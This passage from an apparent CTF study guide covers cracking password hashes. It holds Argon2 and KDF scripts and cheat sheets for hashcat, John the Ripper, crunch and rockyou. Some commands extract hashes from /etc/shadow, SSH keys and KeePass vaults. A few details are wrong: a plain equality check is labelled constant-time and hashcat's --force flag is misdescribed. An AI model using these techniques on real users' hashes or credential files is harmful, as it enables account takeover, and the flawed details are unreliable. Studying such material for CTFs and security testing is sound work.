    parsed = parse_argon2_hash(hash_string)
    
    if not parsed:
        return False
    
    # Map type to enum
    type_map = {
        'Argon2d': Type.D,
        'Argon2i': Type.I,
        'Argon2id': Type.ID
    }
    
    try:
        # Derive key with same parameters
        derived = hash_secret_raw(
            secret=password.encode(),
            salt=parsed['salt'],
            time_cost=parsed['time_cost'],
            memory_cost=parsed['memory_cost'],
            parallelism=parsed['parallelism'],
            hash_len=len(parsed['hash']),
            type=type_map[parsed['type']]
        )
        
        # Constant-time comparison
        return derived == parsed['hash']
    
    except Exception as e:
        print(f"Verification error: {e}")
        return False

# Example usage
hash_str = "$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$iWh06vD8Fy27wf9npn6FXWiCX4K6pW6Ue1Bnzz07Z8A"
is_valid = verify_argon2_custom("testpassword", hash_str)
print(f"Password valid: {is_valid}")
```

**Performance Benchmarking:**

```python
import time
from argon2.low_level import hash_secret_raw, Type

def benchmark_argon2(configs):
    """
    Benchmark different Argon2 configurations
    Useful for estimating cracking time in CTF scenarios
    """
    password = b"benchmark"
    salt = b"saltsaltsalt1234"
    hash_len = 32
    
    results = []
    
    for time_cost, memory_cost, parallelism in configs:
        start = time.time()
        
        hash_secret_raw(
            secret=password,
            salt=salt,
            time_cost=time_cost,
            memory_cost=memory_cost,
            parallelism=parallelism,
            hash_len=hash_len,
            type=Type.ID
        )
        
        elapsed = time.time() - start
        
        results.append({
            'config': f"t={time_cost}, m={memory_cost}, p={parallelism}",
            'time_seconds': elapsed,
            'hashes_per_second': 1 / elapsed if elapsed > 0 else 0,
            'memory_mb': memory_cost / 1024
        })
    
    return results

# Benchmark common configurations
configs = [
    (2, 4096, 1),      # Weak
    (3, 19456, 1),     # Minimum
    (3, 65536, 4),     # Recommended
    (4, 131072, 4),    # Strong
]

print("Argon2id Benchmark Results:")
print("-" * 80)
for result in benchmark_argon2(configs):
    print(f"Config: {result['config']}")
    print(f"  Time: {result['time_seconds']:.4f}s ({result['hashes_per_second']:.2f} H/s)")
    print(f"  Memory: {result['memory_mb']:.1f} MB")
    print()

# [Inference] GPU cracking typically 10-100x slower than CPU for Argon2
# due to memory bandwidth limitations
```

**Extracting Argon2 from Applications:**

```python
import json
import re

def extract_from_database_dump(sql_file):
    """
    Extract Argon2 hashes from SQL database dump
    Common in CTF web application challenges
    """
    argon2_pattern = r'\$argon2(?:id|i|d)\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9+/=]+\$[A-Za-z0-9+/=]+'
    
    hashes = []
    
    with open(sql_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
        matches = re.finditer(argon2_pattern, content)
        
        for match in matches:
            hashes.append(match.group(0))
    
    return list(set(hashes))  # Remove duplicates

def extract_from_json(json_file):
    """
    Extract Argon2 hashes from JSON user database
    """
    with open(json_file, 'r') as f:
        data = json.load(f)
    
    hashes = []
    
    def find_hashes(obj, parent_key=''):
        """Recursively search for Argon2 hashes in JSON"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                if isinstance(value, str) and value.startswith('$argon2'):
                    hashes.append({
                        'field': f"{parent_key}.{key}" if parent_key else key,
                        'hash': value
                    })
                elif isinstance(value, (dict, list)):
                    find_hashes(value, f"{parent_key}.{key}" if parent_key else key)
        
        elif isinstance(obj, list):
            for idx, item in enumerate(obj):
                find_hashes(item, f"{parent_key}[{idx}]")
    
    find_hashes(data)
    return hashes

# Example: Parse user data
# hashes = extract_from_json('users.json')
# for entry in hashes:
#     print(f"Found hash at {entry['field']}: {entry['hash'][:50]}...")
```

**Comparison Script for CTF:**

```python
def compare_kdf_performance():
    """
    Compare performance of different KDF algorithms
    Useful for understanding CTF challenge difficulty
    """
    import hashlib
    import bcrypt
    from argon2.low_level import hash_secret_raw, Type
    import time
    
    password = b"testpassword"
    salt = b"saltsaltsalt1234"
    iterations_reference = 100
    
    results = {}
    
    # PBKDF2-HMAC-SHA256
    start = time.time()
    for _ in range(iterations_reference):
        hashlib.pbkdf2_hmac('sha256', password, salt, 100000, 32)
    results['PBKDF2-SHA256 (100k)'] = time.time() - start
    
    # bcrypt cost 12
    start = time.time()
    for _ in range(iterations_reference):
        bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
    results['bcrypt (cost=12)'] = time.time() - start
    
    # scrypt
    start = time.time()
    for _ in range(iterations_reference):
        hashlib.scrypt(password, salt=salt, n=2**14, r=8, p=1, dklen=32)
    results['scrypt (N=2^14)'] = time.time() - start
    
    # Argon2id
    start = time.time()
    for _ in range(iterations_reference):
        hash_secret_raw(password, salt, 3, 65536, 4, 32, Type.ID)
    results['Argon2id (t=3,m=64M)'] = time.time() - start
    
    print(f"Performance Comparison ({iterations_reference} iterations):")
    print("-" * 60)
    
    # Sort by time
    sorted_results = sorted(results.items(), key=lambda x: x[1])
    
    for name, total_time in sorted_results:
        time_per_hash = total_time / iterations_reference
        hashes_per_sec = iterations_reference / total_time if total_time > 0 else 0
        print(f"{name:25s}: {time_per_hash*1000:.2f} ms/hash ({hashes_per_sec:.2f} H/s)")
    
    print("\n[Inference] Relative cracking difficulty (slowest = hardest):")
    baseline = sorted_results[0][1]
    for name, total_time in sorted_results:
        relative = total_time / baseline
        print(f"  {name:25s}: {relative:.2f}x baseline")

# Run comparison
# compare_kdf_performance()
```

**CTF Challenge Recognition Patterns:**

```python
def identify_kdf_type(hash_or_config):
    """
    Identify KDF algorithm from hash string or configuration
    Helps quickly determine attack approach in CTF
    """
    if isinstance(hash_or_config, str):
        # Identify by hash format
        if hash_or_config.startswith('$2'):
            cost = int(hash_or_config.split('$')[2])
            return {
                'type': 'bcrypt',
                'details': f"Cost: {cost} (2^{cost} = {2**cost:,} iterations)",
                'tool': 'hashcat -m 3200 or john'
            }
        
        elif hash_or_config.startswith('$pbkdf2'):
            parts = hash_or_config.split('$')
            algo = parts[1].replace('pbkdf2-', '')
            return {
                'type': 'PBKDF2',
                'details': f"Algorithm: {algo}",
                'tool': 'hashcat -m 10900/12000/12100 or john'
            }
        
        elif hash_or_config.startswith('$scrypt'):
            parsed = parse_scrypt_hash(hash_or_config)
            if parsed:
                return {
                    'type': 'scrypt',
                    'details': f"N={parsed['N']}, r={parsed['r']}, p={parsed['p']}",
                    'tool': 'hashcat -m 8900 (very slow)'
                }
        
        elif hash_or_config.startswith('$argon2'):
            parsed = parse_argon2_hash(hash_or_config)
            if parsed:
                return {
                    'type': parsed['type'],
                    'details': f"t={parsed['time_cost']}, m={parsed['memory_cost']} KiB, p={parsed['parallelism']}",
                    'tool': 'hashcat -m 29100/29200/29300 (very slow)'
                }
        
        return {'type': 'Unknown', 'details': 'Cannot identify KDF', 'tool': 'Manual analysis required'}
    
    return None

# Example usage
test_hashes = [
    "$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW",
    "$pbkdf2-sha256$100000$c29tZXNhbHQ$XXXXXXXX",
    "$scrypt$ln=14,r=8,p=1$c29tZXNhbHQ$XXXXXXXX",
    "$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$XXXXXXXX"
]

for hash_str in test_hashes:
    result = identify_kdf_type(hash_str)
    print(f"\nHash: {hash_str[:50]}...")
    print(f"Type: {result['type']}")
    print(f"Details: {result['details']}")
    print(f"Tool: {result['tool']}")
```

**Weak Configuration Attack Strategy:**

```python
def generate_attack_plan(kdf_info):
    """
    Generate attack strategy based on KDF parameters
    [Inference] Prioritizes approaches by likelihood of success
    """
    attack_plan = {
        'kdf_type': kdf_info.get('type'),
        'strategies': []
    }
    
    if kdf_info['type'] == 'bcrypt':
        cost = kdf_info.get('cost', 12)
        
        if cost <= 8:
            attack_plan['strategies'].append({
                'priority': 'HIGH',
                'method': 'Dictionary + Rules',
                'reason': f'Low cost ({cost}) makes brute-force feasible',
                'command': 'hashcat -m 3200 hash.txt rockyou.txt -r best64.rule'
            })
        elif cost <= 10:
            attack_plan['strategies'].append({
                'priority': 'MEDIUM',
                'method': 'Targeted wordlist',
                'reason': 'Moderate cost - focus on likely passwords',
                'command': 'hashcat -m 3200 hash.txt common-passwords.txt'
            })
        else:
            attack_plan['strategies'].append({
                'priority': 'LOW',
                'method': 'Look for other vulnerabilities',
                'reason': f'High cost ({cost}) - direct cracking impractical',
                'command': 'Check for password reset, SQL injection, etc.'
            })
    
    elif kdf_info['type'] == 'PBKDF2':
        iterations = kdf_info.get('iterations', 100000)
        
        if iterations < 10000:
            attack_plan['strategies'].append({
                'priority': 'HIGH',
                'method': 'GPU cracking with large wordlist',
                'reason': 'Very low iteration count',
                'command': 'hashcat -m 10900 hash.txt rockyou.txt -w 4'
            })
        elif iterations < 100000:
            attack_plan['strategies'].append({
                'priority': 'MEDIUM',
                'method': 'Dictionary + common mutations',
                'reason': 'Below recommended iterations',
                'command': 'hashcat -m 10900 hash.txt wordlist.txt -r rules/'
            })
    
    elif kdf_info['type'] in ['scrypt', 'Argon2id', 'Argon2i', 'Argon2d']:
        attack_plan['strategies'].append({
            'priority': 'LOW',
            'method': 'Small targeted wordlist only',
            'reason': 'Memory-hard function - cracking very slow',
            'command': 'Use context clues, look for password hints in challenge'
        })
        
        attack_plan['strategies'].append({
            'priority': 'MEDIUM',
            'method': 'Check for application vulnerabilities',
            'reason': 'Direct cracking likely impractical',
            'command': 'Look for timing attacks, side channels, or logic flaws'
        })
    
    return attack_plan

# Example usage
bcrypt_weak = {'type': 'bcrypt', 'cost': 8}
plan = generate_attack_plan(bcrypt_weak)

print(f"Attack Plan for {plan['kdf_type']}:")
for strategy in plan['strategies']:
    print(f"\n[{strategy['priority']}] {strategy['method']}")
    print(f"  Reason: {strategy['reason']}")
    print(f"  Command: {strategy['command']}")
```

**Important CTF Considerations:**

```python
# Decision matrix for KDF cracking in CTF
def ctf_kdf_decision_matrix(time_limit_hours, hash_count, kdf_params):
    """
    Determine if direct cracking is viable within CTF time constraints
    [Inference] Based on typical CTF timeframes and hardware
    """
    # Estimate hashing rate (hashes/second on modern GPU)
    # [Unverified] Rates vary significantly by hardware
    estimated_rates = {
        'bcrypt_cost_10': 10000,
        'bcrypt_cost_12': 2500,
        'pbkdf2_100k': 100000,
        'scrypt_default': 100,
        'argon2_default': 50
    }
    
    rate = estimated_rates.get(kdf_params, 1000)
    
    # Common wordlist sizes
    wordlist_sizes = {
        'rockyou': 14344391,
        'common': 1000000,
        'top10k': 10000
    }
    
    recommendations = []
    
    for wordlist, size in wordlist_sizes.items():
        time_required_hours = (size * hash_count) / (rate * 3600)
        
        if time_required_hours < time_limit_hours * 0.3:  # Within 30% of time limit
            recommendations.append({
                'wordlist': wordlist,
                'viable': True,
                'estimated_hours': time_required_hours,
                'confidence': 'HIGH'
            })
        elif time_required_hours < time_limit_hours:
            recommendations.append({
                'wordlist': wordlist,
                'viable': True,
                'estimated_hours': time_required_hours,
                'confidence': 'MEDIUM - cutting it close'
            })
        else:
            recommendations.append({
                'wordlist': wordlist,
                'viable': False,
                'estimated_hours': time_required_hours,
                'confidence': 'TOO SLOW - look for alternative approach'
            })
    
    return recommendations

# Example: 24-hour CTF, single bcrypt hash cost 10
results = ctf_kdf_decision_matrix(24, 1, 'bcrypt_cost_10')
for rec in results:
    status = "✓" if rec['viable'] else "✗"
    print(f"{status} {rec['wordlist']}: {rec['estimated_hours']:.2f}h - {rec['confidence']}")
```

---

**Key Takeaways for CTF:**

1. **Algorithm Identification**: Always identify the KDF type first - hash format reveals algorithm and parameters
2. **Parameter Analysis**: Weak parameters (low iterations, small memory) indicate cracking is intended solution
3. **Time Management**: Estimate cracking time before starting - if it exceeds CTF duration, look for alternative vulnerabilities
4. **Tool Selection**: Hashcat (GPU) typically fastest, but memory-hard functions (scrypt/Argon2) reduce GPU advantage
5. **Alternative Approaches**: Strong KDF parameters suggest looking for password hints, application vulnerabilities, or logic flaws rather than brute-force

---

## Hash Cracking Tools

### Hashcat

**Installation and Setup**

```bash
# Debian/Ubuntu
sudo apt install hashcat

# Verify installation and check GPU support
hashcat -I  # List OpenCL devices
hashcat -b  # Benchmark tests

# Update hashcat
sudo apt update && sudo apt upgrade hashcat
```

**Basic Hash Identification**

```bash
# Identify hash type
hashcat --identify hash.txt

# Common hash type codes:
# 0     = MD5
# 100   = SHA1
# 1400  = SHA256
# 1700  = SHA512
# 1800  = sha512crypt (Linux)
# 1000  = NTLM
# 3200  = bcrypt
# 500   = md5crypt (Linux)
# 1500  = descrypt (Linux)
# 22000 = WPA-PBKDF2-PMKID+EAPOL
# 16800 = WPA-PMKID-PBKDF2
```

**Dictionary Attacks**

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hash.txt wordlist.txt

# With rockyou.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Multiple hash files
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 0 hash.txt --show

# Output to file
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt

# Force overwrite existing output
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt --force
```

**Rule-Based Attacks**

```bash
# Use built-in rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files:
# best64.rule         - Best 64 rules (good starting point)
# rockyou-30000.rule  - Top 30000 rules from rockyou analysis
# d3ad0ne.rule        - Complex rule set
# dive.rule           - Extensive rule set

# Multiple rule files
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rule1.rule -r rule2.rule

# Custom rule example (create custom.rule):
# $1              - Append '1'
# $!              - Append '!'
# c               - Capitalize first letter
# u               - Uppercase all
# l               - Lowercase all
# d               - Duplicate word

hashcat -m 0 -a 0 hash.txt wordlist.txt -r custom.rule
```

**Mask Attacks (Brute Force)**

```bash
# Character sets:
# ?l = lowercase (abcdefghijklmnopqrstuvwxyz)
# ?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
# ?d = digits (0123456789)
# ?s = special characters (!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~)
# ?a = all characters (?l?u?d?s)
# ?b = all bytes (0x00 - 0xff)

# 8-character lowercase
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# 6-digit PIN
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# Pattern: "pass" + 4 digits
hashcat -m 0 -a 3 hash.txt pass?d?d?d?d

# Pattern: Capital + 6 lowercase + 2 digits
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?l?d?d

# Custom charset
hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1

# Increment mode (try all lengths up to max)
hashcat -m 0 -a 3 hash.txt --increment --increment-min 4 --increment-max 8 ?a?a?a?a?a?a?a?a
```

**Combination and Hybrid Attacks**

```bash
# Combination attack (concatenate words from two lists)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Hybrid attack (wordlist + mask)
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# Hybrid attack (mask + wordlist)
hashcat -m 0 -a 7 hash.txt ?d?d?d?d wordlist.txt
```

**Performance Optimization**

```bash
# Workload profile (1-4, higher = more intensive)
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 3

# Optimize for specific device
hashcat -m 0 -a 0 hash.txt wordlist.txt -d 1  # Use device 1
hashcat -m 0 -a 0 hash.txt wordlist.txt -D 1  # OpenCL device types (1=CPU, 2=GPU)

# Disable potfile (cache of cracked hashes)
hashcat -m 0 -a 0 hash.txt wordlist.txt --potfile-disable

# Debug mode (see rules being applied)
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rule.txt --debug-mode 1 --debug-file debug.txt

# Status timer (show progress every N seconds)
hashcat -m 0 -a 0 hash.txt wordlist.txt --status --status-timer 10
```

**Hash Formats for CTF**

```bash
# MD5
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99

# SHA1
hashcat -m 100 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

# SHA256
hashcat -m 1400 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

# SHA512
hashcat -m 1700 hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt wordlist.txt

# Linux sha512crypt ($6$ format)
hashcat -m 1800 '$6$salt$hash' wordlist.txt

# bcrypt
hashcat -m 3200 '$2a$10$salt/hash' wordlist.txt

# Raw hash with salt
hashcat -m 10 hash:salt wordlist.txt  # md5(pass.salt)
hashcat -m 20 hash:salt wordlist.txt  # md5(salt.pass)

# Base64 encoded hash
echo "hash_base64" | base64 -d | xxd -p | hashcat -m 0
```

**Session Management**

```bash
# Start named session
hashcat -m 0 -a 0 hash.txt wordlist.txt --session mysession

# Restore session
hashcat --session mysession --restore

# Remove session
hashcat --session mysession --remove

# Checkpoint (auto-save every N seconds)
hashcat -m 0 -a 0 hash.txt wordlist.txt --session mysession --checkpoint 60
```

### John the Ripper

**Installation**

```bash
# Debian/Ubuntu (standard version)
sudo apt install john

# Jumbo version (more formats, recommended for CTF)
sudo apt install john-jumbo

# Or compile from source
git clone https://github.com/openwall/john.git
cd john/src
./configure && make
```

**Basic Hash Cracking**

```bash
# Automatic format detection
john hash.txt

# Specify format
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Show formats
john --list=formats | grep -i md5
john --list=formats | grep -i sha
```

**Common Hash Formats**

```bash
# Raw hashes
john --format=raw-md5 hash.txt
john --format=raw-sha1 hash.txt
john --format=raw-sha256 hash.txt
john --format=raw-sha512 hash.txt

# Linux password formats
john --format=sha512crypt hash.txt     # $6$ (modern Linux)
john --format=md5crypt hash.txt        # $1$ (older Linux)
john --format=bcrypt hash.txt          # $2a$/$2b$/$2y$

# Windows
john --format=nt hash.txt              # NTLM
john --format=lm hash.txt              # LM hash

# Web application hashes
john --format=raw-md5 hash.txt
john --format=hmac-sha256 hash.txt

# Other formats
john --format=zip hash.txt             # ZIP archive
john --format=rar hash.txt             # RAR archive
john --format=ssh hash.txt             # SSH private key
```

**Rule-Based Cracking**

```bash
# Default rules
john --wordlist=wordlist.txt --rules hash.txt

# Specific rule set
john --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --wordlist=wordlist.txt --rules=KoreLogic hash.txt

# List available rules
john --list=rules

# Custom rule (in john.conf or command line)
john --wordlist=wordlist.txt --rules=:c hash.txt  # Capitalize

# Common rule commands:
# c  - Capitalize first letter
# C  - Lowercase first, uppercase rest
# u  - Uppercase all
# l  - Lowercase all
# $x - Append character x
# ^x - Prepend character x
# d  - Duplicate word
```

**Incremental Mode (Brute Force)**

```bash
# Default incremental mode
john --incremental hash.txt

# Specific charset
john --incremental=Alpha hash.txt      # Letters only
john --incremental=Digits hash.txt     # Numbers only
john --incremental=Alnum hash.txt      # Alphanumeric

# Custom charset length
john --incremental --min-length=6 --max-length=8 hash.txt
```

**Password File Extraction**

```bash
# Linux shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# ZIP file
zip2john archive.zip > zip_hash.txt
john zip_hash.txt

# RAR file
rar2john archive.rar > rar_hash.txt
john rar_hash.txt

# SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt

# PDF file
pdf2john document.pdf > pdf_hash.txt
john pdf_hash.txt

# Office documents
office2john document.docx > office_hash.txt
john office_hash.txt

# KeePass database
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt

# GPG/PGP private key
gpg2john private_key.asc > gpg_hash.txt
john gpg_hash.txt
```

**Session Management**

```bash
# Show status
john --status

# Restore interrupted session
john --restore

# Restore specific session
john --restore=mysession

# Run in background with status file
john hash.txt > john.log 2>&1 &
john --status
```

**Performance Options**

```bash
# Fork processes (utilize multiple CPU cores)
john --fork=4 hash.txt

# OpenMP threads
john --format=sha512crypt --fork=4 hash.txt

# Show progress
john --wordlist=wordlist.txt hash.txt --progress-every=60
```

### Checksum Tools (md5sum, sha256sum)

**Basic Usage**

```bash
# Generate MD5 hash
md5sum file.txt
echo -n "password" | md5sum

# Generate SHA-256 hash
sha256sum file.txt
echo -n "password" | sha256sum

# Other SHA variants
sha1sum file.txt
sha224sum file.txt
sha384sum file.txt
sha512sum file.txt

# Output only hash (no filename)
md5sum file.txt | cut -d' ' -f1
echo -n "password" | md5sum | cut -d' ' -f1

# Hash without trailing newline (important!)
echo -n "password" | md5sum
# vs
echo "password" | md5sum  # Includes newline!
```

**Verification**

```bash
# Create checksum file
md5sum file1.txt file2.txt > checksums.md5
sha256sum *.txt > checksums.sha256

# Verify checksums
md5sum -c checksums.md5
sha256sum -c checksums.sha256

# Quiet mode (only show failures)
md5sum -c --quiet checksums.md5
```

**CTF Usage Patterns**

```bash
# Quick hash identification
HASH="5f4dcc3b5aa765d61d8327deb882cf99"
echo -n "password" | md5sum | grep $HASH

# Brute force simple passwords
for word in $(cat wordlist.txt); do
    HASH=$(echo -n "$word" | md5sum | cut -d' ' -f1)
    if [ "$HASH" == "target_hash" ]; then
        echo "Found: $word"
        break
    fi
done

# Hash multiple values
cat passwords.txt | while read line; do
    echo -n "$line" | md5sum
done
```

### OpenSSL Digest Functions

**Basic Hash Generation**

```bash
# List available digest algorithms
openssl dgst -list

# MD5
openssl dgst -md5 file.txt
echo -n "password" | openssl dgst -md5

# SHA family
openssl dgst -sha1 file.txt
openssl dgst -sha256 file.txt
openssl dgst -sha384 file.txt
openssl dgst -sha512 file.txt

# Output only hash value
openssl dgst -md5 -hex file.txt | cut -d' ' -f2
echo -n "password" | openssl dgst -md5 -hex | cut -d' ' -f2

# Binary output
openssl dgst -md5 -binary file.txt | xxd -p

# Output to file
openssl dgst -sha256 -out hash.txt file.txt
```

**HMAC (Keyed Hash)**

```bash
# HMAC-MD5
openssl dgst -md5 -hmac "secret_key" file.txt
echo -n "message" | openssl dgst -md5 -hmac "secret_key"

# HMAC-SHA256
openssl dgst -sha256 -hmac "secret_key" file.txt
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"

# HMAC with hex key
openssl dgst -sha256 -hmac "$(echo -n 'key' | xxd -p)" file.txt

# HMAC from binary key file
openssl dgst -sha256 -mac hmac -macopt hexkey:$(xxd -p key.bin | tr -d '\n') file.txt
```

**Digital Signatures**

```bash
# Sign file with private key
openssl dgst -sha256 -sign private.pem -out signature.bin file.txt

# Verify signature with public key
openssl dgst -sha256 -verify public.pem -signature signature.bin file.txt

# Sign and output base64
openssl dgst -sha256 -sign private.pem file.txt | base64 > signature.b64

# Verify base64 signature
base64 -d signature.b64 | openssl dgst -sha256 -verify public.pem -signature /dev/stdin file.txt
```

**Advanced Digest Operations**

```bash
# Create password hash for verification
PASSWORD="mypassword"
SALT=$(openssl rand -hex 16)
HASH=$(echo -n "${PASSWORD}${SALT}" | openssl dgst -sha256 -hex | cut -d' ' -f2)
echo "Hash: $HASH"
echo "Salt: $SALT"

# PBKDF2 (Password-Based Key Derivation)
echo -n "password" | openssl enc -pbkdf2 -pass stdin -S $(echo -n "salt" | xxd -p) -iter 10000

# Compare hash timing (constant-time comparison concept)
openssl dgst -sha256 -hex file1.txt
openssl dgst -sha256 -hex file2.txt
```

### Crunch (Wordlist Generator)

**Installation**

```bash
sudo apt install crunch
```

**Basic Wordlist Generation**

```bash
# Syntax: crunch <min-length> <max-length> [charset]

# 4-6 character lowercase
crunch 4 6 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# 8-character alphanumeric
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Using predefined charsets
crunch 6 6 -f /usr/share/crunch/charset.lst lalpha -o wordlist.txt

# List available charsets
cat /usr/share/crunch/charset.lst

# Common charsets:
# lalpha        = lowercase
# ualpha        = uppercase
# mixalpha      = mixed case
# numeric       = digits
# lalpha-numeric = lowercase + digits
# mixalpha-numeric = mixed case + digits
```

**Pattern-Based Generation**

```bash
# Pattern syntax:
# @ = lowercase
# , = uppercase
# % = digits
# ^ = special characters

# Pattern: "pass" + 4 digits
crunch 8 8 -t pass%%%% -o wordlist.txt

# Pattern: 3 lowercase + 3 digits
crunch 6 6 -t @@@%%% -o wordlist.txt

# Pattern: Uppercase + 6 lowercase + 2 digits
crunch 9 9 -t ,@@@@@@%% -o wordlist.txt

# Fixed characters in pattern
crunch 10 10 -t user@@@@%% -o wordlist.txt
```

**Advanced Options**

```bash
# Limit output size (MB)
crunch 4 6 abc -b 100mb -o START

# Start at specific word
crunch 4 4 abc -s aabc -o wordlist.txt

# End at specific word
crunch 4 4 abc -e abcc -o wordlist.txt

# Pipe directly to hashcat
crunch 8 8 | hashcat -m 0 hash.txt

# Suppress duplicates
crunch 4 4 abc -d 2@ -o wordlist.txt  # No more than 2 consecutive same chars

# Invert output (exclude pattern)
crunch 4 4 abc -i -o wordlist.txt

# Compress output
crunch 6 6 abc | gzip > wordlist.txt.gz
```

**CTF-Specific Patterns**

```bash
# Common password patterns
crunch 8 8 -t Password%%%% -o wordlist.txt
crunch 6 10 -t admin@@@@@ -o wordlist.txt

# Date formats (YYYYMMDD)
crunch 8 8 -t 20%%%%%% -o dates.txt

# Phone number patterns
crunch 10 10 -t 555%%%%%%% -o phones.txt

# Hex values
crunch 8 8 0123456789abcdef -o hex.txt

# Common PIN codes
crunch 4 4 0123456789 -o pins.txt

# License plate format
crunch 7 7 -t @@@%%%% -o plates.txt
```

**Memory and Performance Considerations**

```bash
# Estimate output size before generating
crunch 8 8 abc -c 0

# Split large wordlists
crunch 8 8 abc -b 100mb -o START

# Stream to tool without file creation
crunch 6 6 | john --stdin hash.txt
```

### RockyYou.txt Wordlist

**Location and Usage**

```bash
# Standard location
/usr/share/wordlists/rockyou.txt

# Extract if compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Download if not present
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# File information
wc -l /usr/share/wordlists/rockyou.txt  # Line count
du -h /usr/share/wordlists/rockyou.txt  # File size
```

**Common CTF Usage**

```bash
# With hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# With john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Top N passwords
head -n 1000 /usr/share/wordlists/rockyou.txt > top1000.txt

# Filter by length
awk 'length($0) == 8' /usr/share/wordlists/rockyou.txt > length8.txt
awk 'length($0) >= 6 && length($0) <= 10' /usr/share/wordlists/rockyou.txt > length6-10.txt

# Filter by pattern
grep '^[a-z]*$' /usr/share/wordlists/rockyou.txt > lowercase_only.txt
grep '[0-9]' /usr/share/wordlists/rockyou.txt > contains_digits.txt
grep '^[A-Z]' /usr/share/wordlists/rockyou.txt > starts_uppercase.txt
```

**Creating Custom Wordlists from RockyYou**

```bash
# Remove duplicates
sort -u /usr/share/wordlists/rockyou.txt > rockyou_unique.txt

# Convert to lowercase
tr '[:upper:]' '[:lower:]' < /usr/share/wordlists/rockyou.txt > rockyou_lower.txt

# Add year suffixes
while read word; do
    for year in {2020..2025}; do
        echo "${word}${year}"
    done
done < top1000.txt > wordlist_with_years.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt /usr/share/wordlists/rockyou.txt | sort -u > combined.txt
```

### Online Hash Databases

**CrackStation**

```bash
# Manual lookup: https://crackstation.net/

# API usage (if available)
curl -X POST "https://crackstation.net/api" \
  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99"

# Batch lookup script
while read hash; do
    echo "Checking: $hash"
    # Manual lookup or API call
done < hashes.txt
```

**Other Online Resources**

```bash
# MD5 databases:
# - https://md5decrypt.net/
# - https://www.md5online.org/
# - https://hashes.com/

# Multi-algorithm:
# - https://crackstation.net/
# - https://hashes.com/en/decrypt/hash

# Automated lookup script template
lookup_hash() {
    HASH=$1
    
    # Try CrackStation
    echo "[*] Checking CrackStation..."
    
    # Try MD5Decrypt
    echo "[*] Checking MD5Decrypt..."
    
    # Try local database
    grep "$HASH" /path/to/local/hash/database.txt
}

# Usage
lookup_hash "5f4dcc3b5aa765d61d8327deb882cf99"
```

**Building Local Hash Database**

```bash
# Generate rainbow table (simple example)
while read word; do
    MD5=$(echo -n "$word" | md5sum | cut -d' ' -f1)
    SHA1=$(echo -n "$word" | sha1sum | cut -d' ' -f1)
    SHA256=$(echo -n "$word" | sha256sum | cut -d' ' -f1)
    echo "$MD5:$word" >> md5_db.txt
    echo "$SHA1:$word" >> sha1_db.txt
    echo "$SHA256:$word" >> sha256_db.txt
done < /usr/share/wordlists/rockyou.txt

# Lookup function
lookup_local() {
    HASH=$1
    grep "^$HASH:" md5_db.txt | cut -d':' -f2
}
```

### CTF Hash Cracking Workflow

```bash
#!/bin/bash
# Complete CTF hash cracking workflow

HASH_FILE="target_hash.txt"
HASH=$(cat $HASH_FILE)

echo "[*] Target hash: $HASH"

# Step 1: Identify hash type
echo "[*] Identifying hash type..."
hashcat --identify $HASH_FILE
hash-identifier <<< "$HASH"

# Step 2: Try online databases
echo "[*] Checking online databases..."
# Manual lookup at crackstation.net

# Step 3: Quick dictionary attack
echo "[*] Trying rockyou.txt..."
hashcat -m 0 -a 0 $HASH_FILE /usr/share/wordlists/rockyou.txt --quiet

# Step 4: Dictionary with rules
echo "[*] Trying with rules..."
hashcat -m 0 -a 0 $HASH_FILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --quiet

# Step 5: Mask attack for common patterns
echo "[*] Trying common patterns..."
hashcat -m 0 -a 3 $HASH_FILE '?l?l?l?l?d?d?d?d' --quiet

# Step 6: Show result
hashcat -m 0 $HASH_FILE --show
```

---

**Important Related Topics:**

- Password policies and complexity analysis for targeted attacks
